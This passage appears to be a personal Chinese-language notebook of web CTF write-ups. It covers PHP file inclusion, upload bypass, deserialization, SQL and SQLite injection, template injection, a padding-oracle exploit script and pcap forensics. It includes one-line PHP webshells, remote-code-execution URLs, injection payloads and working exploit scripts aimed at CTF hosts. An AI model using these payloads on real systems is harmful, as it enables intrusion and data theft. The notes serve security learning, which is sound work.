ever%20never%20never%20give%20up%20%21%21%21%22%3B%0A%7D%0A%0A%0A%3F%3E
	
	";if(!$_GET['id']) {
		header('Location: hello.php?id=1');
		exit();
	}
	$id=$_GET['id'];
	$a=$_GET['a'];
	$b=$_GET['b'];
	if(stripos($a,'.'))	{
		echo 'no no no no no no no';
		return ;
	}
	$data = @file_get_contents($a,'r');
	if($data=="bugku is a nice plateform!" and $id==0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
		require("f4l2a3g.txt");
	else
		print "never never never give up !!!";
	?>
	既然是 require(f4l2a3g.txt) 直接看看这个文件？flag就直接能看到了

	
# 细心
	出现一个假的404页面，源代码里面也啥都没有，尝试扫扫后台，发现 robots.txt
	打开它，发现一个 resusl.php 文件，再进去看一下，提示 _GET['x'] == password
	提交 x = admin ，结果真中了，如果还没出来，只能想办法爆破了
	
	
# flag.php
	有个登录框，点 login 没反应，题名叫 flag.php，肯定有这个文件，进去看一下
	啥都没有。上面提交之所以没反应，是因为 action=#，之前猜测直接给flag.php post 
	user & password 的值，还是没卵用，试试post hint?，还是没用，最终看别人的解释是
	在flagphp处get hint=1，直接出源码了？？还是要多尝试，反正就这么多套路
	
	 <?php
		error_reporting(0);
		include_once("flag.php");
		$cookie = $_COOKIE['ISecer'];
		if(isset($_GET['hint']))
			show_source(__FILE__);
		elseif (unserialize($cookie) === "$KEY") 
			echo "$flag";
		else {
			?>
			<html>
			<head>
			<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
			<title>Login</title>
			<link rel="stylesheet" href="admin.css" type="text/css">
			</head>
			<body>
			<br>
			<div class="container" align="center">
			  <form method="POST" action="#">
				<p><input name="user" type="text" placeholder="Username"></p>
				<p><input name="password" type="password" placeholder="Password"></p>
				<p><input value="Login" type="button"/></p>
			  </form>
			</div>
			</body>
			</html>

		<?php
		}
			$KEY='ISecer:www.isecer.com';
		?> 
		
	打算直接提交ISecer = $KEY 的反序列化，后面发现在此之前$KEY都没有被定义，所以KEY是空的，
	只需提交空的序列化上去就可以了
		<?php
			$cookie = serialize("$key");
			print_r($cookie);
		?>
	这样构造一下，就得到了 s:0:"";
	但是注意;(分号)在cookie中不会被正确的上传到服务器，构造URL编码
	;的URL编码为%3B
	所以 cookie:ISecer=s:0:""%3B
	
	
# INSERT INTO注入
	error_reporting(0);

	function getIp(){
		$ip = '';
		if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){
			$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
		}else{
			$ip = $_SERVER['REMOTE_ADDR'];
		}
		$ip_arr = explode(',', $ip);
		return $ip_arr[0];
	}

	$host="localhost";
	$user="";
	$pass="";
	$db="";

	$connect = mysql_connect($host, $user, $pass) or die("Unable to connect");

	mysql_select_db($db) or die("Unable to select database");

	$ip = getIp();
	echo 'your ip is :'.$ip;
	$sql="insert into client_ip (ip) values ('$ip')";
	mysql_query($sql);

# 多次
	又是一个注入题，常规的 and 1=1 啥的都被过滤掉了，多积累姿势

# getshell
	之前还以为要传马，后面查wp发现是我想多了，只要成功传php文件就能拿到flag
	顺便学习下文件上传
	Content-Type: Multipart/form-data + .php5 ???

# 文件包含2
	直接伪协议试试：php://filter/read=convert.base64-encode/resource=index.php
	=> NAIVE! 查看源码发现 upload.php => 文件上传

	wp上写的是.php;.jpg，我的直接传个 .gif，然后利用本身的 file=xxx，查看了所传图片，命令就被执行了
	// 命令执行
	<script language=php> system("ls")</script>
	// 牛逼啊，直接能看到本目录下的所有文件
	about hello.php index.php this_is_th3_F14g_154f65sd4g35f4d6f43.txt upload upload.php
	还有个思路，传马之后，菜刀连接，此处不用改后缀名也能解析？？
	// 一句话木马
	<script language=php>eval($_POST['A'])</script>


# PHP_incrypt_1
	fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=

	<?php
	function encrypt($data,$key) {
		$key = md5('ISCC');
		$x = 0;
		$len = strlen($data);
		$klen = strlen($key);
		for ($i=0; $i < $len; $i++) { 
			/*
			if ($x == $klen) {
				$x = 0;
			}*/
			$char .= $key[$x % $klen];
			$x += 1;
		}
		for ($i=0; $i < $len; $i++) {
			// $str .= chr((ord($data[$i]) + ord($char[$i])) % 128);
			$str .= chr((ord($data[$i]+ $key[$i % $klen]) % 128);
			// chr 字符，ord ASCII码
		}
		return base64_encode($str);
	}
	?>

	import hashlib
	import base64

	key = hashlib.md5("ISCC".encode('utf-8')).hexdigest()
	base_64 = "fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA="
	base_64 = base64.b64decode(base_64)
	data_len = len(base_64)

	str_ = ""
	for i in range(len(base_64)):
		str_ += chr((base_64[i]-ord(key[i%len(key)]))%128)  # 这个题有点水
	print(str_)

# 文件上传2(湖湘杯)
	这个题有点坑，我把源码都弄下来后仔细的看能不能绕过，结果看下别人的wp，直接有一个flag.php，我之前没扫出来。
	这教会了我一个道理，先扫flag，flag.php已加入字典，以后就能扫出来了。
	
	下面的安全性已经非常高了，后缀被控死
	upload.php

	<?php
	include 'common.php';

	if(isset($_POST['submit']) && isset($_FILES['image'])) {
		$fn = $_FILES['image']['tmp_name'];     // 存储在服务器的文件的临时副本的名称
		$ft = $_FILES['image']['type'];         // 上传文件的类型

		if(!is_uploaded_file($fn)) {  // 判断指定的文件是否是通过 HTTP POST 上传的。
			fatal('uploaded file corrupted');
		}

		$array = array('image/png');
		if(!in_array($ft,$array)){
			fatal("Sorry, only PNG files are allowed.");
		}

		$imagekey = create_image_key();

		move_uploaded_file($fn, "uploads/$imagekey.png");

		header("Location: ?op=show&imagekey=$imagekey");
	?>


	show.php

	<?php
	include 'common.php';

	if(empty($_GET['imagekey'])) {
		header('Location: ?op=home');
		exit();
	}

	$imagekey = $_GET['imagekey'];
	$im = load_image($imagekey);

	$w = imagesx($im);
	$h = imagesy($im);
	if($w > MAX_IM_SIZE || $h > MAX_IM_SIZE)
		fatal("Invalid image dimensions.");
	?>
	<center>
	<div class="article">
		<h2></h2>
		<p><img src="uploads/<?=$imagekey;?>.png" />
		<div>
			<a href="uploads/<?=$imagekey;?>.png">View saved image</a>
		</div>
	</div>
	</center> 


	common.php

	<?php
	if(!defined('FROM_INDEX')) die();

	define('MAX_IM_SIZE', 100);

	function create_image_key() {
		return sha1($_SERVER['REMOTE_ADDR'] . $_SERVER['HTTP_USER_AGENT'] . time() . mt_rand());
	}

	function load_image($imagekey) {
		if(1 !== preg_match('/[0-9a-f]{40}/', $imagekey)) {
			fatal('Invalid image key.');
			// imagekey=9f6703af622b96dc1a4d01b889587f1ee3fc88d7
		}

		$im = imagecreatefrompng("uploads/{$imagekey}.png");
		if(!$im) {
			fatal('Failed to load image.');
		}
		return $im;
	}
	stream_wrapper_unregister ("zip");
	?>

# 这是一个神奇的登录框
	直接sqlmap的post注入搞定了

# ssi
	EIS2018题感觉不错加上了
	http://httpd.apache.org/docs/current/howto/ssi.html
	https://www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injection
	https://blog.csdn.net/wutianxu123/article/details/82724637
	https://www.secpulse.com/archives/66934.html
	<?php
	class TinySSI {
		public function parse($content) {
			$parsed = $connect;
			/** #include **/
			$parsed = preg_replace_callback('|<!--#include virtual="(.*?)"(\s)*-->|',
			function ($matches) { 
				$output = file_get_contents("./" . $matches[1]); 
				return $output; 
			}, $parsed); 
			return $parsed; 
		} 
	}
	?>
	<?php
	echo "Flag is in the file 'flag' in this path\n";
	require_once('ssi.php');
	$parser = new TinySSI;
	if(isset($_GET['name'])){
		echo("Your name is " . $parser->parse($_GET['name']));
		exit();
	}
	?>
	<!--#include virtual="flag" -->


# sql注入2
	全都tm过滤了绝望吗？
	提示 !,!=,=,+,-,^,%


# flag 被盗
	跟踪了几个TCP流，发现shell.php，后来在TCP流中直接看到了flag


# 中国菜刀
	看了几个数据流，发现了一下内容
	flag.tar.gz	2016-06-27 08:45:38	203	0666
	log.txt	2015-06-03 12:18:46	1502	0666
	news.asp	2014-06-27 03:44:24	365	0666
	SaveFile.asp	2014-06-27 05:45:08	822	0666
	testNull.php	2014-07-17 08:06:14	16	0666
	upload.html	2014-06-27 05:27:46	364	0666
	webshell.php	2014-07-21 05:52:36	18	0666
	xiaoma.asp;.jpg	2014-07-04 08:17:18	1312	0666

	猜测 caidao.pcapng 包含了其他文件
	使用 binwalk 查看一下
	7747          0x1E43          gzip compressed data, from Unix, last modified: 2016-06-27 08:44:39
	
	提取 dd if=caidao.pcapng of=1.gzip skip=7747 bs=1 
	
	解压 ➜  CTF tar -xvf 1.gzip 
	gzip: stdin: decompression OK, trailing garbage ignored
	flag/
	flag/flag.txt
	tar: Child returned status 2
	tar: Error is not recoverable: exiting now

	可直接导出？以后补充


# 这么多数据包
	打开一看真的是很多数据包，看一下http，没有。
	题目提示，寻找 getshell 流。一般的 getshell 流的 TCP 的报文中很可能包含 command 这个字段，
	我们可以通过 【协议 contains "内容"】 来查找 getshell 流
	tcp contains "command"
	看到几个tcp
	再追踪tcp流
	C:\>type s4cr4t.txt
	type s4cr4t.txt
	Q0NURntkb195b3VfbGlrZV9zbmlmZmVyfQ==
	C:\>shutdown -r -t 100 -m "Stupid Manager!"
	shutdown -r -t 100 -m "Stupid Manager!"
	
	
# 百越杯 买手机
	重点学习 zio
	import hashpumpy
	import urllib
	from urlparse import parse_qsl
	from zio import *
	import re, string, itertools
	io = zio(('117.50.13.182', 8888))
	io.read_until('Command: ')
	io.writeline('2')
	io.writeline('9')
	io.read_until('Your order:\n')
	c = io.readline('\n')
	d = parse_qsl(c)
	hash = d[3][1].strip()
	pr = 'product=Flag&price=99999&timestamp=%s'%(d[2][1])
	print hash, pr
	for i in range(8,32):
		ret = hashpumpy.hashpump(hash, pr, '&price=233', i)
		order = '%s&sign=%s' %(ret[1], ret[0])
		io.writeline('3')
		io.read_until('\n')
		io.writeline(order)
		io.read_until('Command: ')


	from pwn import *
	# context.log_level = 'debug'
	import hashpumpy
	p = remote("117.50.13.182",8888)

	p.sendline('2')
	p.sendline('9')
	timestamp = p.recvuntil("&sign=")[-22:-6]

	sign = p.recvuntil("\n")
	sign = sign[:-1]
	pr = "product=Flag&price=99999&timestamp="+timestamp

	for i in range(8,32):
		ret = hashpumpy.hashpump(sign,pr,"&price=11",i) 
		order = '%s&sign=%s'%(ret[1],ret[0])
		temp = p.recv()
		if "Well" in temp:
			print "------------------------------>>>>>",temp
			exit()
		p.sendline('3')
		p.recv()
		p.sendline(str(order))
	#flag{Hash_leNgth_eXt3ns1on_attack_!S)_E@sy}


# SWPUCTF2018 web3
	乍一看

# XCTF adworld Guess
    伪协议查看源码：
	http://111.198.29.45:32406/?page=php://filter/read=convert.base64-encode/resource=index

	upload.php	
	<?php
	error_reporting(0);
	function show_error_message($message) {
		die("<div class=\"msg error\" id=\"message\">
		<i class=\"fa fa-exclamation-triangle\"></i>$message</div>");
	}

	function show_message($message) {
		echo("<div class=\"msg success\" id=\"message\">
		<i class=\"fa fa-exclamation-triangle\"></i>$message</div>");
	}

	function random_str($length = "32") {
		$set = array("a", "A", "b", "B", "c", "C", "d", "D", "e", "E", "f", "F",
			"g", "G", "h", "H", "i", "I", "j", "J", "k", "K", "l", "L",
			"m", "M", "n", "N", "o", "O", "p", "P", "q", "Q", "r", "R",
			"s", "S", "t", "T", "u", "U", "v", "V", "w", "W", "x", "X",
			"y", "Y", "z", "Z", "1", "2", "3", "4", "5", "6", "7", "8", "9");
		$str = '';

		for ($i = 1; $i <= $length; ++$i) {
			$ch = mt_rand(0, count($set) - 1);
			$str .= $set[$ch];
		}
		$filename = './uP1O4Ds/' . $str . '_'
		return $str;
	}
	session_start();

	$reg='/gif|jpg|jpeg|png/';
	if (isset($_POST['submit'])) {
		$seed = rand(0,999999999);  // 生成随机数做种子
		mt_srand($seed);  // 用seed给随机数发生器播种
		$ss = mt_rand();  // 取随机数
		$hash = md5(session_id() . $ss);	
		setcookie('SESSI0N', $hash, time() + 3600);
		// SESSION e6bf37f50f6f9f290e834613beb73cac  4bfeacdfd8404d5c03e91441ffef3a18
		// 得到一个随机数 352940737
		// 得到可能的种子 3281694990 3281694991 981279433

		/*
		zip://uP1O4Ds/xlKZUYfp47Dl1cHKvGz84VIY64sIItpF_test.png%23test&a=phpinfo();
		zip://uP1O4Ds/uISoLxXH6C3FBakm7buwAMVQGR3zwRoG_test.png%23test&a=phpinfo();
		zip://uP1O4Ds/HNugRX9Vq7I2o9Tq67KrDbERlYpMjZGp_test.png%23test&a=phpinfo();
		zip://uP1O4Ds/HQQ6DPmMEyttuA9AB5bic3MzOfOTKSa4_test.png%23test&a=phpinfo();
		zip://uP1O4Ds/H4zDu3QZU6pbeFFLl8ax8TKMDwusUQfu_test.png%23test&a=phpinfo();

		*/

		zip://uP1O4Ds/Ah86F1AZxgsLc8UUjkHPZRKMoCM3XUdT_test.png%23test&a=phpinfo();
		
		/uP1O4Ds/NugRX9Vq7I2o9Tq67KrDbERlYpMjZGpI_test.png

		zip://uP1O4Ds/OjOqKNhiJZUIgqFKGTVLHvk99BZNejf6_1.png1&a=phpinfo();

		zip://uP1O4Ds/fds3uXk1hjEypt342Br71GmEuSvDpGSo_1.png/1&a=echo system('ls');
		zip://uP1O4Ds/st8LyW7GqjK8SniSUB7RCBERGsHrplZn_1.png/1&a=echo system('ls');
		zip://uP1O4Ds/OjOqKNhiJZUIgqFKGTVLHvk99BZNejf6_1.png/1&a=echo system('ls');

		if ($_FILES["file"]["error"] > 0) {
			show_error_message("Upload ERROR. Return Code: " . $_FILES["file-upload-field"]["error"]);
		}
		$check2 = ((($_FILES["file-upload-field"]["type"] == "image/gif")
				|| ($_FILES["file-upload-field"]["type"] == "image/jpeg")
				|| ($_FILES["file-upload-field"]["type"] == "image/pjpeg")
				|| ($_FILES["file-upload-field"]["type"] == "image/png"))
			&& ($_FILES["file-upload-field"]["size"] < 204800));
		$check3=!preg_match($reg,pathinfo($_FILES['file-upload-field']['name'], PATHINFO_EXTENSION));


		if ($check3) show_error_message("Nope!");
		if ($check2) {
			$filename = './uP1O4Ds/' . random_str() . '_' . $_FILES['file-upload-field']['name'];
			if (move_uploaded_file($_FILES['file-upload-field']['tmp_name'], $filename)) {
				show_message("Upload successfully. File type:" . $_FILES["file-upload-field"]["type"]);
			} else show_error_message("Something wrong with the upload...");
		} else {
			show_error_message("only allow gif/jpeg/png files smaller than 200kb!");
		}
	}
	?>


	index.php
	<?php
	error_reporting(0);

	session_start();
	if(isset($_GET['page'])){
		$page=$_GET['page'];
	}else{
		$page=null;
	}

	if(preg_match('/\.\./',$page)) {
		echo "<div class=\"msg error\" id=\"message\">
		<i class=\"fa fa-exclamation-triangle\"></i>Attack Detected!</div>";
		die();
	}
	?>

	<?php
	if($page) {
		if(!(include($page.'.php'))) {
			echo "<div class=\"msg error\" id=\"message\">
		<i class=\"fa fa-exclamation-triangle\"></i>error!</div>";
			exit;
		}
	}
	?>

	爆破随机数种子(session_id为我们的 PHPSESSID，hash为SESSI0N)
	ini_set(‘max_execution_time’, ‘0’);  // 设置运行时间无限

	http://111.198.29.45:30278/?page=zip://uP1O4Ds/FQclJFtaEBXXgNuc4nfI1kC7HXTZn3Xx_test.png%23test/test&a=echo%20system(%27cat%20./flag-Edi98vJF8hnIp.txt%27);
	xctf{3fbbe15371c9cd42ec1a698d7660849a} xctf{3fbbe15371c9cd42ec1a698d7660849a}
	http://111.198.29.45:30278/?page=zip://uP1O4Ds/FQclJFtaEBXXgNuc4nfI1kC7HXTZn3Xx_test.png%23test/test&a=echo%20system(%27ls%27);
	CSS flag-Edi98vJF8hnIp.txt index.html index.php js uP1O4Ds upload.php upload.php


# adworld simple_js
	function dechiffre(pass_enc){
		var pass = "70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65";
		var tab  = pass_enc.split(',');
		var tab2 = pass.split(',');
		var i,j,k,l=0,m,n,o,p = "";
		i = 0;
		j = tab.length;
		k = j + (l) + (n=0);
		n = tab2.length;
		for(i = (o=0); i < (k = j = n); i++ ) {
			o = tab[i-l];
			p += String.fromCharCode((o = tab2[i]));
			if(i == 5) 
				break;
		}
		for(i = (o=0); i < (k = j = n); i++ ){
			o = tab[i-l];
			if(i > 5 && i < k-1)
					p += String.fromCharCode((o = tab2[i]));
		}
		p += String.fromCharCode(tab2[17]);
		pass = p;
		return pass;
	}
	String["fromCharCode"](dechiffre("\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"));
	55,56,54,79,115,69,114,116,107,49,50

	h = window.prompt('Enter password');
	alert( dechiffre(h) );


# FlatScience Hack.lu-2017
	目录扫描得到 login.php admin.php，也可以直接查看 robots.txt
	<!-- TODO: Remove ?debug-Parameter! -->
	此处 login.php?debug=1 可看到源码

	<?php 
		ob_start(); 
	?> 

	<?php 
	if(isset($_POST['usr']) && isset($_POST['pw'])){ 
			$user = $_POST['usr']; 
			$pass = $_POST['pw']; 

			$db = new SQLite3('../fancy.db'); 
			
			$res = $db->query("SELECT id,name from Users where name='".$user."' and password='".sha1($pass."Salz!")."'"); 
		if($res){ 
			$row = $res->fetchArray(); 
		} 
		else{ 
			echo "<br>Some Error occourred!"; 
		} 

		if(isset($row['id'])){ 
				setcookie('name',' '.$row['name'], time() + 60, '/'); 
				header("Location: /"); 
				die(); 
		} 
	} 

	if(isset($_GET['debug'])) 
		highlight_file('login.php'); 
	?> 
	<!-- TODO: Remove ?debug-Parameter! --> 

	开始 sqlite 注入 参考文章 https://www.anquanke.com/post/id/85552

	获得表信息
	usr=111' union select 1,name FROM sqlite_master WHERE type='table' limit 0,1 --&pw=f
	只有一个表 Users

	获得所有表结构：
	usr=111' union select 1,sql FROM sqlite_master WHERE type='table' limit 0,1 --&pw=f

	CREATE TABLE Users(
		id int primary key,
		name varchar(255),
		password varchar(255),
		hint+varchar(255)
	);

	usr=111' union select 1, name FROM users limit 0,1 --&pw=f
	admin	3fab54a50e770d830c0416df817567662a9dc85c	my+fav+word+in+my+fav+paper

	将网站上的所有 pdf 下载下来，我们这里用 wget 递归下载：wget xxx.com -r -np -nd -A .pdf

	-r：层叠递归处理
	-np：不向上（url 路径）递归
	-nd：不创建和 web 网站相同（url 路径）的目录结构
	-A type：文件类型


	参考 https://chybeta.github.io/2017/10/22/Hack-lu-CTF-2017-Flatscience-writeup/
	暴力py脚本
	from cStringIO import StringIO
	from pdfminer.pdfinterp import PDFResourceManager, PDFPageInterpreter
	from pdfminer.converter import TextConverter
	from pdfminer.layout import LAParams
	from pdfminer.pdfpage import PDFPage
	import sys
	import string
	import os
	import hashlib
	def get_pdf():
		return [i for i in os.listdir("./") if i.endswith("pdf")]
	def convert_pdf_2_text(path):
		rsrcmgr = PDFResourceManager()
		retstr = StringIO()
		device = TextConverter(rsrcmgr, retstr, codec='utf-8', laparams=LAParams())
		interpreter = PDFPageInterpreter(rsrcmgr, device)
		with open(path, 'rb') as fp:
			for page in PDFPage.get_pages(fp, set()):
				interpreter.process_page(page)
			text = retstr.getvalue()
		device.close()
		retstr.close()
		return text
	def find_password():
		pdf_path = get_pdf()
		for i in pdf_path:
			print "Searching word in " + i
			pdf_text = convert_pdf_2_text(i).split(" ")
			for word in pdf_text:
				sha1_password = hashlib.sha1(word+"Salz!").hexdigest()
				if sha1_password == '3fab54a50e770d830c0416df817567662a9dc85c':
					print "Find the password :" + word
					exit()
	if __name__ == "__main__":
		find_password()

	参考 https://wu.rot26.team/CTF/Hacklu/2017/web/flatscience/
	find -name *.pdf -exec pdftotext {} \;
	mkdir txts
	find -name *.txt -exec cp {} txts \;
	for i in `ls`; do tr -c '[:alnum:]' '[\n*]' < $i | sort | uniq ; done > wordlist

	import hashlib
	from tqdm import tqdm

	with open('wordlist') as words:
		__values__ = words.readlines()
		for word in tqdm(__values__):
			word = word[:-1]
			hash_object = hashlib.sha1(b""+word+"Salz!")
			hex_dig = hash_object.hexdigest()
			if "3fab54a50e770d830c0416df817567662a9dc85c" in hex_dig:
				print word


# lottery Qctf2018
	<?php
	function random_num(){
		do {
			$byte = openssl_random_pseudo_bytes(10, $cstrong);
			$num = ord($byte);
		} while ($num >= 250);

		if(!$cstrong){
			response_error('server need be checked, tell admin');
		}
		
		$num /= 25;
		return strval(floor($num));
	}

	function random_win_nums(){
		$result = '';
		for($i=0; $i<7; $i++){
			$result .= random_num();
		}
		return $result;
	}

	$same_count = 0;
	for($i=0; $i<7; $i++){
		if($numbers[$i] == $win_numbers[$i]){
			$same_count++;
		}
	}
	?>

	openssl_random_pseudo_bytes() 之前的第一想法是找破解办法，猜出随机数，找半天发现确实不行。用不着死磕，思路不行立即变换，死磕没有任何意义。
	看下wp之后，毕竟两星级，确实非常简单，弱类型绕过。
	{"action":"buy","numbers":[true,true,true,true,true,true,true]}

	有的选手用了暴力重复注册然后买彩票的方法。
	考虑了一下这种方法花费的时间并不比直接审计代码短，为了给广大彩民一点希望，
	可以留作一种备选的非预期解，就没有改题加验证码或者提高flag价格。

	这也是好玩法，可惜没环境了，不然试试看。

	http://111.198.29.45:31444/?page=111%27)%20or%20system(%27cat%20templates/flag.php%27)%3b%23


#mfw csaw-ctf-2016-quals
	githack 得到源码

	<?php
		$file = "templates/" . $page . ".php";

		// I heard '..' is dangerous!
		assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");

		// TODO: Make this look nice
		assert("file_exists('$file')") or die("That file doesn't exist!");
	?>

    http://111.198.29.45:31444/?page=111%27)%20or%20system(%27cat%20templates%2fflag.php%27)%3b%23
	闭合，并注释后面的语句

# CSAW CTF 2016 wtf.sh wtf.sh
	https://github.com/ernw/ctf-writeups/tree/master/csaw2016/wtf.sh
	GET /post.wtf?post=../../../../../../../../../../../tmp/wtf_runtime/wtf.sh/users*
	USERNAME=admin; TOKEN=uYpiNNf/X0/0xNfqmsuoKFEtRlQDwNbS2T6LdHDRWH5p3x4bL4sxN0RMg17KJhAmTMyr8Sem++fldP0scW7g3w==


# 微软表单填写
	https://germey.gitbooks.io/python3webspider/7.1-Selenium%E7%9A%84%E4%BD%BF%E7%94%A8.html

	https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1548080354&rver=7.0.6738.0&wp=MBI_SSL&wreply=https:%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin%3Fru%3Dhttps%253A%252F%252Faccount.microsoft.com%252F%253Frefd%253Dlogin.live.com%2526ru%253Dhttps%25253A%25252F%25252Faccount.microsoft.com%25252F%25253Frefd%25253Dlogin.live.com&lc=2052&id=292666&lw=1&fl=easi2
	账户id：i0116
	https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1548080354&rver=7.0.6738.0&wp=MBI_SSL&wreply=https:%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin%3Fru%3Dhttps%253A%252F%252Faccount.microsoft.com%252F%253Frefd%253Dlogin.live.com%2526ru%253Dhttps%25253A%25252F%25252Faccount.microsoft.com%25252F%25253Frefd%25253Dlogin.live.com&lc=2052&id=292666&lw=1&fl=easi2
	密码id：i0118


# biscuiti-300
	https://blog.csdn.net/qq_19876131/article/details/53674972
	考察知识点：sql注入，php 弱类型比较（两者为空则相等），cbc padding oracle attack
	from Crypto.Util.number import *
	from Crypto.Cipher import AES
	import requests
	import time
	import base64


	def xor(a, b):
		return "".join([chr(ord(a[i]) ^ ord(b[i % len(b)])) for i in xrange(len(a))])

	def add_pad(s):
		block_len = 16
		pad_len = block_len - len(s)
		return s + chr(pad_len)*pad_len

	def padding_oracle_attack(cipher, plain):
		after_dec = ""
		for k in range(1, 17):
			for i in range(0, 256):
				pad = xor(after_dec, chr(k)*(k-1))
				iv = "A"*16
				c = "A"*(16-k) + chr(i) + pad + cipher
				assert len(iv + c) == 48
				uname = "' UNION SELECT 'a', '%s" % (base64.b64encode(iv + c))
				url = "http://biscuiti.pwn.seccon.jp/"
				payload = payload = {"username":uname, "password":""}
				r = requests.post(url, data=payload)

				if r.text.find("Hello") < 0:
					after_dec = chr(i ^ k) + after_dec
					print after_dec.encode("hex")
					break

		assert len(after_dec) == 16            
		prev_cihper = xor(after_dec, plain)
		return prev_cihper


	uname = "' UNION SELECT 'aaaaaaaaaaaaaaaaaaaaaaaaaa', 'hoge"
	url = "http://biscuiti.pwn.seccon.jp/"
	payload = payload = {"username":uname, "password":""}
	r = requests.post(url, data=payload)

	jsession = r.headers['set-cookie'].split("=")[1].replace("%3D", "=")

	u = base64.b64decode(jsession)
	j = u[:-16]
	mac_j = u[-16:]

	P = [j[i: i+16] for i in range(0, len(j), 16)]
	C = [""]*5

	P[4] = add_pad(P[4])
	C[4] = mac_j

	for i in reversed(range(1,5)):
		C[i-1] = padding_oracle_attack(C[i], P[i])


	# C = ["88bb7c4931651cb975e48e9008c1a911".decode("hex"),
	#     "6106b1d3251bea689f161c65d85705eb".decode("hex"),
	#     "fc04f5ccfdcfed064cf3200eace65257".decode("hex"),
	#     "d48fa8585b30d06b5b5515659b5f03d8".decode("hex"),
	#     "a853d2fb8dc8d23b5bca133bb84039d7".decode("hex")]

	P[4] = add_pad("b:1;}")
	P[2] = xor(xor(P[4], C[3]), C[1])


	uname = "' UNION SELECT 'aaaaaaaaaa%s', 'hoge" % P[2]
	url = "http://biscuiti.pwn.seccon.jp/"
	payload = payload = {"username":uname, "password":""}
	r = requests.post(url, data=payload)

	jsession = r.headers['set-cookie'].split("=")[1].replace("%3D", "=")

	u = base64.b64decode(jsession)
	j = u[:-16]
	mac_j = u[-16:]

	P = [j[i: i+16] for i in range(0, len(j), 16)]
	C = [""]*5

	P[4] = add_pad(P[4])
	C[4] = mac_j

	for i in reversed(range(3,5)):
		C[i-1] = padding_oracle_attack(C[i], P[i])

	# C[2] = "3d469b651494c9a3289e00191a6bafb6".decode("hex")

	jsession = base64.b64encode('a:2:{s:4:"name";s:26:"aaaaaaaaaaaaaaaaaaaaaaaaaa";s:7:"isadmin";b:1;}'+C[2])
	url = "http://biscuiti.pwn.seccon.jp/"
	header = {"Cookie":"JSESSION=%s" % jsession.replace("=","%3D")}
	r = requests.post(url, headers=header)
	print r.text


# adworld upload
	前端验证，直接抓包改名绕过
	直接给出了目录，system($_GET['cmd'])，antsword连接，连接不上，可能是docker很多命令都没安装
	再试试eval，系统命令没有，PHP的总是可以把，用了下 scandir('../')，发现有 flag.php，现在的任务就是读取flag.php，
	file_get_contents("../flag.php")居然没反应，灵机一动 highlight_file() 成功了
	http://111.198.29.45:32032/upload/1548320743.2.php?cmd=highlight_file("../flag.php");


# XCTF 4th-QCTF-2018 Confusion1
	题目描述：
	One day, Bob said “PHP is the best language!”, but Alice didn’t agree it, so Alice write a website to proof it. 
	She published it before finish it but I find something WRONG at some page.(Please DO NOT use scanner!)
	<!--Flag @ /opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt-->
	<!--Salt @ /opt/salt_b420e8cfb8862548e68459ae1d37a1d5.txt-->
	http://111.198.29.45:32058/%7B%7B''['__cla'+'ss__']['__mr'+'o__'][2]['__subcla'+'sses__']()[40]('opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt').next()%7D%7D
	python 模板注入
	https://www.freebuf.com/column/177864.html
	https://portswigger.net/blog/server-side-template-injection
	https://hwhxy.github.io/ctf/2018/07/26/%E4%BB%8ECTF%E4%B8%AD%E5%AD%A6%E4%B9%A0%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/


# XCTF 4th-CyberEarth 签到题
	题目描述：云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。
	看到送分题就尴尬了一下，试了下SQL注入，全跳转到id=1，id=2没反应，看下wp，没想到是爆破到id=2333，需要脑洞啊
	wp：https://www.secpulse.com/archives/67980.html https://www.secfree.com/article/695.html
	官方wp太辣眼睛


# XCTF 4th-CyberEarth ics-01
	<?php
	error_reporting(0);
	ini_set('open_basedir', '/var/www/html');
	
	function autoload($page) {
		if (stripos($_SERVER['QUERY_STRING'], 'flag') > 0) {
			die('no flag flag flag flag !');
		}
	
		if (stripos($_SERVER['QUERY_STRING'], 'uploaded') > 0) {
			die('no uploaded uploaded uploaded uploaded !');
		}
	
		if (stripos($_SERVER['QUERY_STRING'], '://f') > 0) {
			die('no ://f ://f ://f');
		}
	
		if (stripos($_SERVER['QUERY_STRING'], 'ata') > 0) {
			die('no ata ata ata');
		}
	
		if (stripos($_SERVER['QUERY_STRING'], '0') > 0) {
			die('no 0 0 0');
		}
	
		if (file_exists("./includes/$page.php")) {
			include "./includes/$page.php";
		} elseif (file_exists("./includes/$page")) {
			include "./includes/$page";
		} else {
			echo "File is not exit ";
		}
	}
	
	
	function download($adfile, $file) {
		//Only Administrators can download files .
		$cert = 'N';
		if (isset($adfile) && file_get_contents($adfile, 'r') === 'Yeah Everything Will Be Ok My Boss') {
			echo "Welcome ! You Are Administrator !";
			$cert = 'Y';
		} else {
			echo "error1";
		}
		if ($cert === 'Y') {
			if (stripos($file, 'file_list') != false) {
				die('error4');
			}
			if (stripos($file, 'file_list') >= 0) {
				header('Content-Deion: File Transfer');
				header('Content-Type: application/octet-stream');
				header('Content-Disposition: attachment; filename='. basename($file));
				header('Content-Transfer-Encoding: binary');
				header('Expires: 0');
				header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
				header('Pragma: public');
				header('Content-Length: ' . filesize($file));
				readfile($file);
			} else {
				die('error2');
			}
		} else {
			echo 'error3';
		}
	}
	
	if (!isset($_GET['page'])) {
		$page = 'index';
	} else {
